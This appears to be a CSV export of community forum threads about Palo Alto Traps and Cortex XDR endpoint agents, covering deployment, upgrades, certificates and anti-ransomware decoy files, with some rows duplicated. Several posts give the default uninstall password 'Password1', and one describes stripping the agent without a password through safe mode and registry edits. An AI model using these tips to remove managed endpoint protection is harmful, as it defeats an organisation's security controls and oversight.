,Discussion ID,Author,Body,Likes,Date,Time
0,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
1,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
2,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
3,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
4,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
5,455987,pdysart,I just had a tech coordinator call me with the same issue. How did this issue end up getting resolved?,0,06-22-2022,02:14 PM
6,455987,tobar,"Hello@pdysartthe original post was from 2021, but , wich agent version do you have?the issue is just in 1 computer?Have you seen any anormal behavior in that computer?Regards,wtobar",0,06-22-2022,03:12 PM
7,436664,ancis,The traps cleaner app can only be provided by Palo Alto Networks support team.,0,03-16-2022,12:47 AM
8,467207,SutareMayur,"Hi@ceapen01No, currently there’s no way on Palo Alto to insert a client IP in a header.",1,02-27-2022,10:25 PM
9,283114,TuanTranCOT,Verifying Cortex XDR Agent Protection Status in Registry - Knowledge Base - Palo Alto Networks,0,01-19-2022,03:25 PM
10,443116,kiwi,"Hi@Unknown10,Try your luck with the default password (Password1). (https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-prevent-admin/endpoint-security/custo...If that doesn't work you can push a new password to the agent through the ESM.If all else fails, I'd recommend reaching out to support.Hope it helps,-Kiwi.",0,10-25-2021,06:09 AM
11,443116,BPry,"@Unknown10,Traps should be reporting where it's registered directly in the console. Since Traps can't just install itself automatically, it's likely that you got this install pushed from a company you work for/with through connecting to their VPN or something like that. If you can find out where it's trying to check-in to, you can contact that company to have it removed.Outside of the password being the default Password1, or getting the company to tell you the uninstall password or push the uninstall command to your agent, you would need to reinstall your OS to actually remove the Traps agent. The uninstall password is baked into the Traps profile and the MSI itself.",1,10-25-2021,04:33 PM
12,443116,Unknown10,"Hi Kiwi, I tried it but unfortunately it didn't work, anyway thanks for your help.",0,10-26-2021,05:24 AM
13,443116,Unknown10,"Hi Bpry, my laptop's not a business one. It's my personal which I use at home. And I tried to install ESM Console and Traps Agent but they required something that I don't have. However, I had to download an uninstall software to do that, and now the problem solved. Thanks for your response.",0,10-26-2021,05:27 AM
14,411936,nikoolayy1,"Check the Palo Alto known issues for your version and addressed issues for newer version than yours by searching for SNMP:https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-release-notes/pan-os-9-1-release-information/kno...https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-release-notes/pan-os-9-1-addressed-issues/pan-os...From what I see in the Palo Alto app center when I search for SNMP there is no app-id for snmpv3-traps, so the snmp-trap id should match v2 or v3. If it is not a bug with your palo alto PANOS version and you have updated the ""Applications and Threats Content Updates"" database by using dynamic updates to the latest version then palo alto needs to fix this as this is well known application and you don't have write your own custom app-id and signature for it or use the Application Override.https://applipedia.paloaltonetworks.com/",0,06-08-2021,11:47 PM
15,411936,GlennKrutsinger,"Hi Ben,I'm having the same issue. Checked the Fixed and Known issues, nothing for SNMP. Did you find a solution other than the workaround for an app override?Thansk,Glenn",0,09-13-2021,08:01 AM
16,411936,ben_netsol,"Hi Glenn,Unfortunately I've had no more time to do the data collection exercise required by Palo to justify an app ID update. My workaround, which wasn't an app override, has been working successfully though, so it solved my immediate problem.I created a policy that has an app-id of snmpv3 plus a service of udp/162. This allows the v3 traps to pass through the firewall. You just have to be conscious of placing the policy above any other that might match snmpv3 without the added service.Cheers,Ben.",1,10-18-2021,05:08 PM
17,429072,avelK,"Hi@Mohammed_Yasinthank you for post and sorry to hear you are facing this issue.As per the official Cisco Release Note, there is no known compatibility issue between AnyConnect and Traps:https://www.cisco.com/c/en/us/td/docs/security/vpn_client/anyconnect/anyconnect49/administration/gui...however, Cisco recommends to exclude the below folders from any 3rd party security product:C:\Users\<user>\AppData\Local\CiscoC:\ProgramData\CiscoC:\Program Files (x86)\CiscoIn the case you are using Hostscan module for posture check, please exclude also below processes:cscan.execiscod.execstub.exeHere is the official guide:https://www.cisco.com/c/en/us/td/docs/security/vpn_client/anyconnect/anyconnect410/release/notes/rel...Could you please try to apply application whitelist for the above folders and processes in Traps? In the case it does not resolve the issue, I would recommend to collect more logs to understand root cause of this issue.Could you please collect DART bundle from affected machine? Here is the manual how to collect DART:https://community.cisco.com/t5/security-documents/how-to-collect-the-dart-bundle-for-anyconnect/ta-p...Once the DART bundle is generated, you will find the DART bundle on desktop. Please extract it and navigate to Folder: ""Cisco AnyConnect Secure Mobility Client"" and open: ""AnyConnect.txt"". In this file you will see all AnyConnect client logs including the error you reported. Please look for any log entries before this error was generated.If DART does not provide any clue, I would recommend to collect logs from your VPN HeadEnd. If you are using ASA, the please run below debugs while the client having issue tries to connect:debug ldap 255debug webvpn anyconnect 255debug dap trace 255The above debug commands provide a lot of output. In the case there are several users connecting at the same time, the output might be hard to read, therefore I recommend to log the session to text file and ideally run it outside of the peak hours when less users are connecting. After you complete the log collection, please issue: ""u all"" to cancel all debugs.If both DART nor debugs on VPN HeadEnd side do not provide enough information to understand what exactly Traps is doing to cause this issue, please let me know. There are still a few more things left to drill down into this issue.I hope this helps and good luck!Kind RegardsPavel",0,09-05-2021,06:37 AM
18,427271,SteveCantwell,"Good DayHow have you confirmed that this file is NOT malicious in nature? As you know, there is both static analysis on a brand new/unseen file, as well as the dynamic analysis from the WF cloud. If it is claiming to be malicious, I would ask that you do your diligence to confirm if this is false positive. If so, then you can either create an exception for that signature, or go to the WF portal and ask that PANW re-check their verdict.",0,08-24-2021,09:39 AM
19,423933,Sarc845,"Hey there,Usually the uninstall pass word is ""Password1""Let me know if this helps?",0,08-02-2021,09:24 AM
20,317055,dfalcon,"Hi there,Please see step 3 in the document listed at this URL:https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-pro-admin/get-started-with-cortex-xdr...Do you know if the 3 certs are trusted on the Linux server in question?",0,03-31-2020,07:15 PM
21,317055,MartinSauer,"Hello,has anyone had luck installing Cortex Agent to Linux Mint 20? I have had no issues running Ubuntu Linux (20.04 LTS), but keep getting the ""SSL Exception: error:14090086:SSL routines:ssl3_get_server_certificate:certificate verify failed"" error on Mint.Certificates are installed the same way as on Ubuntu, openssl verification to the server is successful.Thanks, best regardsMartin",0,07-27-2020,07:29 AM
22,317055,ARM,"It's seems a problem between PA's kubernetes config and some version of openssl <1.1.1, because in 1.1.1 they change the behavior:This works on modern distros (openssl > 1.1.0i) but not in Centos 6 (1.0.1e):openssl s_client -connect distributions.traps.paloaltonetworks.com:443In Centos 6 you need to set the TLS SNI with -servernameopenssl s_client -servername distributions.traps.paloaltonetworks.com -connect distributions.traps.paloaltonetworks.com:443Relevant info to fix this on the server side:https://www.ssllabs.com/ssltest/analyze.html?d=distributions.traps.paloaltonetworks.com&latesthttps://github.com/kubernetes/ingress-nginx/issues/1984https://github.com/kubernetes/ingress-nginx/issues/6398https://kubernetes.github.io/ingress-nginx/user-guide/tls/https://cloud.google.com/kubernetes-engine/docs/how-to/ingress-multi-sslhttps://support.cloudbees.com/hc/en-us/articles/360019630132-Issue-connecting-External-Client-Master...https://www.ibm.com/docs/en/cloud-paks/cp-management/1.3.0?topic=troubleshooting-key-management-serv...",0,07-19-2021,05:08 AM
23,176242,BPry,"@matin.logmein,Outside of client logs have you looked at the actual ESM console. I would believe that if Traps was interacting with anything it should be logged there.",0,09-15-2017,01:41 PM
24,176242,arsoleruben,Have a similar problem. The CoreSimulatorBridgge is being trapped by theDylib-Hijacking ProtectionSame for .net 5 debugging code,0,05-31-2021,02:58 PM
25,321883,dfalcon,"Hi there. If you are talking about low severity alerts, you can view them by clicking on Investigation > Incidents. Once in the incidents screen - on the top right of the interface, you'll see a link for the Alerts Table. You should see them there.",0,04-09-2020,07:33 AM
26,321883,Rob-Basil,"David,Great, I see them there, thanks. But why are they not showing in the ""Top Incidents (Top 10)"" widget on the dashboard? It's only showing the High and Medium alerts even when there are less than 10 alerts I would expect it to show all of them.The low alerts are also not showing in the ""Open incidents by Severity"" widget. It looks like all of the dashboard widgets are ignoring any Low level alerts.",0,04-09-2020,07:36 AM
27,321883,dfalcon,"I need a little more info here before answering. When you list the incidents under Investigation > Incidents, are they showing up there as incidents (low severity incidents) or are they only showing up in the Alerts Table?",0,04-09-2020,07:42 AM
28,321883,Rob-Basil,They are only showing in the Alerts Table.Even when I specifically choose to show them in the Incidents they don't show up unless I choose the alerts table.,0,04-09-2020,07:42 AM
29,321883,Rob-Basil,,0,04-09-2020,07:48 AM
30,321883,dfalcon,"There is a chance that a low severity alert will not create an actual incident. A typical scenario where this applies is when you have a malware prevention with no additional action required. You will still receive the alert because it happened, but there is no action required on your part. Incidents, on the other hand, usually require some type of response / interaction. Incidents are essentially one or more alerts that are related to an event -- grouped together. You may still see some low-severity incidents that come across - these require attention, but have been prioritized lower than the mediums and highs. .",2,04-09-2020,07:49 AM
31,321883,Rob-Basil,"David,Understood, thanks for the explanation.We keep a close eye on the Low level alerts for when kids at the schools are trying to run software. Sure would be nice to be able to view them in a widget on the dashboard that we display 24/7 to the office.",0,04-09-2020,07:53 AM
32,321883,dfalcon,"On the software front, there are a few things you can do such as blocking grey-ware and enabling device control to block USB drive usage.On the widget side, I can take the feedback of having a widget that shows alert statistics back to Product Management as a possible future product enhancement. Do you have a vision of what you would like to see in it so I can submit an enhancement request?",0,04-09-2020,07:59 AM
33,321883,Rob-Basil,"We do block grey-ware and some more well known portable programs. Since a lot of our classes let students save their work to a USB drive we cannot block those.We like the three widgets below. Would love to have the same type of widgets, but have them display all alerts instead of just Incidents.As of right now, there are no widgets that display anything about alerts (unless they require some type of user action to clear) that I can see.",0,04-09-2020,08:06 AM
34,395361,YAlhazmi,FYI the next content update fixed this issue,0,05-05-2021,03:02 PM
35,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
36,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
37,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
38,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
39,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
40,383197,dfalcon,"Hi@CyberEye-From one of the workstations, what do you see during the upgrade attempt? Is the package getting there? Is there an error? Or is it failing without any notification. Have you tried running the installer directly from a workstation?As far as the upgrade goes from SCCM, I would actually use a standalone installer. I believe the upgrade .zip contains multiple installers.",0,02-01-2021,06:10 AM
41,383197,CyberEye,We restarted the server and seems the issue resolved,0,02-22-2021,02:15 AM
42,385151,gjenkins,"Hi@AsifSid,At this moment in time, all content update delivery methods are automated either directly between the XDR agent and server or between agents using peer-to-peer communication while on the same broadcast domain. Are you finding that devices that are online and checking into the XDR server are having issues updating? If so, I've found one way of alleviating this problem is by turning disabling content bandwidth management, bandwidth control under Cogwheel > Settings > Agent Configuration. If you do that, is your devices able to get the latest content update? If not, we may have a case for Support where they will need to find an RCA as to why the endpoints are not pulling the latest update.",0,02-10-2021,03:08 PM
43,365234,dfalcon,Hi@jgchang8-I will check with the agent Product Manager and let you know. The most current content will be available here.https://docs.paloaltonetworks.com/compatibility-matrix/cortex-xdr/where-can-i-install-the-cortex-xdr...,0,12-06-2020,11:12 AM
44,365234,dfalcon,Hi@jgchang8-I checked with the Product Management team. Big Sur support will not be added to Traps 4.2. All subsequent macOS versions will be addressed with Cortex XDR.,0,12-06-2020,11:24 AM
45,362165,dfalcon,"Hi@OsamaKhan-As long as you meet the agent requirements, you should be fine. See here:https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-pro-admin/endpoint-security/hardened-...Lastly, for clarification -- host-based firewall is a Cortex XDR feature and is not a feature of Traps.",0,12-06-2020,11:08 AM
46,350449,EddieRowe,"It does appear the setting disappeared from my tenant as well! The online documentation no longer makes no mention of it, but I have the PDF version from last week so I have PROOF. 8-) Here is what the PDF copy of the manual had for the feature which was not mentioned anywhere in last week's release notes.",1,09-18-2020,02:54 PM
47,350449,Conroy,"Small businesses often have a false sense of confidence about cybersecurity; they simply do not see themselves as targets. And even if they are targets, they think it won’t matter: Many believe they have nothing of value to an attacker. Of course, that sort of complacency makes them ideal targets.",0,10-25-2020,06:45 AM
48,328126,dfalcon,"Hi@harrychanni-The official license allocation times can be found here:https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-prevent-admin/cortex-xdr-prevent-over...If you have duplicates, you will want to delete the older ones. From a best practice standpoint, it would be great to understand why duplicates are there -- and try to remediate that situation.",0,05-18-2020,08:34 PM
49,328126,Ignacio_Medina,"Hi!. we have the same issue. some endpoints appears duplicated, butin this cases, some times in same day.What we can see difrent is the endpointID. endpoint name, agent version, user loged are the same...",0,10-07-2020,03:20 AM
50,345809,Kim_Hansen,"Hi@MihaIT,Have you tested the following command:For Install:For uninstall:/Kim",0,09-01-2020,11:58 PM
51,345809,MihaIT,"Sorry for late response. I was on vacation, so I could try it.No unfortunately that command for uninstall doesn't work.It just waits for ever. (under WinRM)If I run it locally it opens popup that msiexec didn't get the parameters.",0,09-07-2020,12:08 AM
52,191025,aper,"hi@Pawel_KaczanowskiI recommend reaching out to support as they will be able to confirm the issue and help resolve it if it is related to an issue with Traps, and probably also help you troubleshoot if it is not related to trapsplease keep us posted on your situation as it may help other people if they encounter this issue",0,12-11-2017,04:27 AM
53,191025,jvalentine,"Yes, this is a Traps issue. The files you see are dummy/decoy files related to the anti-Ransomware capabilities introduced in Traps v4.1.0. Under normal conditions, you're not supposed to see these files. TAC should be able to help you figure out what's not working properly.",1,12-11-2017,06:27 AM
54,191025,tobar,"Hello,I found those files in my computer when I perform on-demand scan with my AV, using CMD I couldn't find them, but using Power Shell that was possible, then I asked to support for that, the answer:""those files are a tramp injected by paloalto traps, that works when is a new ransomware, the ransomware try to encrypt the files and traps catch it and block the ransomware.""So I put that concept on the run in effect, traps stop the action. Please look at the picture attached.Regards,wtobar",1,12-11-2017,11:10 AM
55,191025,KS,"Files and folders with ZZZZZ* or !!!!!* may be displayed not only in PowerShell but also in programs that use file/folder dialog boxes.I am experiencing it with some text editors.In order not to display it, you need to add a rule to disable Anti-Ransomware Protection for the program in which it appears.",2,12-11-2017,04:42 PM
56,191025,SeanCM,"It would have been nice, if Palo Alto, had put a notice about this SOMEWHERE, during the Trapsinstallation maybe......maybe a nice picture of Admiral Ackbar warning us about these files.I've just lost 2 half days trying to find SOMETHING to clean up this !!!!! and ZZZZZ mess left by my-imagined mystery malware!Only to find out it is a ""red-herring"" created by Traps!These things are hidden very well, with only System and Guest having special permissions... BUT some applications or file-dialog windows show them... leading one to think something is wrong... when it isn't.The file manager ""File Voyager"" shows them clear as day.The file manager ""File Locater Lite"" shows them in the results of searches.",0,12-15-2017,01:46 PM
57,191025,thinson,The information about the files created for the Anti-Ransomware module was shared in the Traps 4.1 documentation under new features. Palo is rapidly adding new features to Traps so I highly advise you review that section of the documentation before you upgrade. If you have the resources for a UA environment where you can keep several handfuls of production machines that will help as well.https://www.paloaltonetworks.com/documentation/41/endpoint/newfeaturesguide/security-features/anti-r...,0,12-20-2017,05:55 AM
58,191025,SeanCM,"That's great, but not all of us front-lineadministrators get access to...A.) the administrative features of Traps.B.) any of the documentation.Some of us front-line administrators merely get told... ""Use this. It has been tested.""We just install it, or uninstall it, or look at the limited interface the client-end-point product has.AND remember all those installations already done... when the chief administrator controlling the Traps server said ""okay""... all those installations automatically updated... so us front-line guys don't even know when those are updating.AND it is a COMMON cultural joke, that men DON'T READ the manual first...So to expect that behavior, even if you are just saying for legal reasons......that expectation is poorly made.Many pieces of software announce ""New features!"" during the installation.Something like this would be good to put there.A simple graphic showing:!!!!! and ZZZZ <--- Don't Panic!Traps created these!That's all you need to do during the install...",0,12-20-2017,07:26 AM
59,191025,Christoff_Gosse,"on every USB Stick or HDD you plug in, you will get the files on it.That´s not i want to have!!!How can i disable these zzzz !!!! Files on removeble storage devices ?",0,12-21-2017,04:34 AM
60,191025,MarkusKnappe,These files are only virtual and are pretended to be Windows processes by the Traps processes. None of these files and folders are physically located on a disk.,0,12-21-2017,07:52 AM
61,336626,dfalcon,"Hi@Abdul_Razaq-I hope all is well. It is my understanding (haven't touched ESM in a few years now) that a role with read access is all that is required. If you're having trouble with a read-access account, let me know and I can try to stand up an ESM to test.https://docs.paloaltonetworks.com/traps/4-2/traps-endpoint-security-manager-admin/administer-the-esm...",0,07-29-2020,02:48 PM
62,337456,Burns,"I have not seen this particular error code, but we too, have had issues with upgrades. If you have tamper protect enabled, try disabling it. If not, Palo Alto support can review the support files for you, and, if needed, provide the XDR Cleaner tool to force uninstall the agent.The general fix seems to be:1. Disable protection and tamper protect2. Try Upgrade again.3. If upgrades still fail, run the XDR Cleaner tool, reboot4. Install fresh (may create a duplicate entry)",0,07-09-2020,01:02 PM
63,337456,KRisselada,"thanks for the reply@PBurnsActually while both I and my client were looking into this today (he has also had a case opened) and they mentioned some of the items (and others) that you mentioned, but none seem to be the trick.What we did see, when I was looking in the trapsd.log in the Support Files collection, I found THIS URL:https://panw-xdr-installers-prod-us.storage.googleapis.com/windows/7.1.1.49751Even though we had asked several times, there was no one that mentioned THIS one that we should make sure is whitelisted and not decrypted NGFW/PrismaAccess. Once this was added to the other already included URL's the upgrades worked.This appears to be a NEW URL that some clients may need to whitelist. I am putting it here in the LIVEcommunity because it was not seen or identified in any documentation my client has been provided with, even though he explicitly asked if URL's other than the ones he been informed of earlier were required.Hope this is helpful also to others as something to try, until PAN can put out additional documentation of what may need to be whitelisted.",1,07-09-2020,03:01 PM
64,337456,KRisselada,"I should update this post to state that we found the following (see step 4, ie: ""...exclude Cortex XDR services from decryption..."") that may have been updated a few days before this original post, but we were not aware of it at the time.https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-pro-admin/get-started-with-cortex-xdr...",0,07-17-2020,06:18 AM
65,338858,ancis,"Unfortunately there is no built in flow that will allow you to downgrade an agent. You will need to uninstall and re-install the lower version. If you believe the latest version is causing performance issues, I would recommend to open a case with support to have them review. If confirmed the engineering team will want to know about it, and fix it.",0,07-16-2020,06:56 AM
66,338858,dfalcon,"And to add on to what Eric said, since you are on 7.1.1 -- you may check into 7.1.2 now.",0,07-16-2020,07:31 AM
67,336022,ancis,can you describe your issue in greater detail.,0,06-30-2020,05:51 AM
68,336022,Ahmedsadek,We can log in MS team normally through windowsdesktop while we can't do this through android devices and when monitoringlogs show a decrypterror,0,06-30-2020,06:10 AM
69,336022,ancis,what version of traps or cortex agent are you working with?,0,06-30-2020,06:29 AM
70,316738,dfalcon,Do you know if the certificate has been trusted? See step 3 here:https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-pro-admin/get-started-with-cortex-xdr...You may have to pull down the cert and install it. See example here:https://blog.confirm.ch/adding-a-new-trusted-certificate-authority/,0,03-31-2020,07:23 PM
71,316738,gbagita,I've got the same problem and solved it this way:,0,06-22-2020,07:57 AM
72,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
73,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
74,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
75,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
76,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
77,329737,dfalcon,"Hi @lhatsadourian -Are you still having this issue? If so, are you seeing any error messages in the logs? Also, can you log into the WildFire portal? https://wildfire.paloaltonetworks.com ?",0,06-02-2020,10:04 PM
78,329737,hatsadourian,Hi@dfalconYes I still have this issue. Our Service Provider has contacted paloalto support as partner.I'm waiting for news. i don't have the account to contact wildfire. My partner has.,0,06-03-2020,06:49 AM
79,330348,dfalcon,"Hi @FaizalHasnol -The release notes page details what is new and also has a section for known issues. You can find the info at: https://docs.paloaltonetworks.com/traps/4-2/traps-endpoint-security-manager-release-notes/release-in...If you look at the left hand menu, you can find the answers to your questions by browsing through each topic.",0,06-02-2020,10:02 PM
80,328326,dfalcon,Hi@AhmedSallam-I'm not sure on this answer. I've passed the link to this article to one of our reps that can provide us the answer. I will let you know his response.,0,05-18-2020,09:05 PM
81,328326,dfalcon,"Hi @AhmedSallam -Sorry, I was out of the office yesterday. I heard back from one of the sales reps. The tier letter serves no technical purpose or difference in service whatsoever. It only has to do with quantity of agents.",0,05-21-2020,11:43 AM
82,328326,AhmedSallam,Hi@dfalconThx so much for your always support.Best Regards,0,05-22-2020,04:58 AM
83,326387,dfalcon,"The on-premise Traps Endpoint Security Manager (ESM) end of life has been announced. The date can be found here:https://www.paloaltonetworks.com/services/support/end-of-life-announcements/end-of-life-summaryCortex XDR Prevent (and Pro) offers an on-premise broker to serve as a proxy; however, the management component is in the cloud.",1,05-06-2020,07:52 AM
84,326387,AhmedSallam,"Good Afternoon DavidThx for your detailed replay . So if i choose to use Traps cloud version , Will traffic be inspected locally on clients workstations that have traps installed before leave to the Internet or traffic will be inspected at Palo Alto servers at Cloud before leave to the Internet ?Best Regards",0,05-06-2020,08:15 AM
85,326387,dfalcon,"Most everything is handled locally, with the exception of malware verdicts. Instead of leveraging signature files, the agent will check with WildFire via a SHA-256 hash. If the file is known, it will respond accordingly. If it is unknown, local analysis will score the file and make a temporary verdict. At the same time the file is uploaded and detonated in WildFire. After analysis, the file is known. This logic is the same logic that applied in the on-premise ESM.Do you have connectivity challenges or are you trying to limit internet traffic?",1,05-06-2020,08:25 AM
86,326387,AhmedSallam,"Good Morning DavidMany thanks for your fast response and your willing to help . The case that the customer is governmental entity and cloud solution not allowed for governmental solution . The reason that for normal cloud solution - as per my knowledge- , All files should be sent to cloud to be inspected first before leave to the internet.Based on you last replay , I would like to summarize the below:Is there any major difference between the two solutions from your point of view ?Best Regards",0,05-06-2020,03:39 PM
87,326387,dfalcon,"Hi@AhmedSallamThere are quite a few differences between ESM and Cortex XDR. You get significantly more features in Cortex XDR. Some differences include:1. Management server location (Cloud vs on-Prem)2. Cortex XDR has more prevention features (Behavior Threat Protection, etc)3. Agent communication (Cortex XDR - communicates over internet / ESM - communicates while on network, VPN, or DMZ exposed Core)4. EDR capabilities available in Cortex XDR5. Cortex XDR has device control features (USB Device control, Host-based firewall, bitlocker support)6. Cortex XDR allows response capabilitiesWildFire is used in both solutions. WildFire is cloud-based.",1,05-06-2020,04:13 PM
88,326387,AhmedSallam,"Hello DavidThx for the good presentation for EMS vsCortex XDR . I think if i need to have good replacement for EMS , The equivalentis TMS . Is that true ? I think Cortex XDR will be required only if behavioral analysis is required . Is this true ?Best Regards",0,05-06-2020,04:49 PM
89,326387,dfalcon,"Hi@AhmedSallamSo TMS doesn't technically exist anymore. The features previously available within TMS are now available within Cortex XDR Prevent. Cortex XDR Pro (which includes the features in Prevent) gives you the additional features that were not available in TMS. This includes features such as IOCs, BIOCs, hunting, analytics, etc.",1,05-06-2020,06:49 PM
90,326387,AhmedSallam,Hello DavidThanks for your email . That's make everything clear . The below is the quotation sent by PaloAlto distributor in Egypt . Does the below refer to endpointCortex XDR Prevent ?,0,05-06-2020,08:12 PM
91,326387,AhmedSallam,Good Morning David@dfalconI hope you are doing well. Are you able to confirm weatherthe quotation sent by PaloAlto distributor in Egypt - that I shared in my previous message- refer to endpointCortex XDR Prevent ?Thx in advance,0,05-07-2020,03:44 PM
92,211509,Abdul_Razaq,"Hi@nandersen,It is bit late response. i am also looking for a way to do this. have you found a way to do this ? ie, a non-domain core with LDAP connection to AD . Also have you tried via TLS ?",0,05-19-2020,11:57 PM
93,278583,thomaskoetsier,"Have you tried the default agent uninstall password? It's ""Password1""Failing that if you contact PAN support they should be able to provide you with a removal tool that will remove Traps entirely from the machine, without the need for a password.",1,07-24-2019,02:30 AM
94,278583,MarcinSt,"Hi, @AsifSidAt the very begining: it is possbile to get rid of Traps agent without password. It needs to manual cleaning of registry (tricky part, you have to know what are you doing) and I wen thru this process with and without PANW's support.Even if agent's services protects itself you can always boot windows in safe mode and use registry editor then just delete agent's files.regards.",0,07-27-2019,08:54 AM
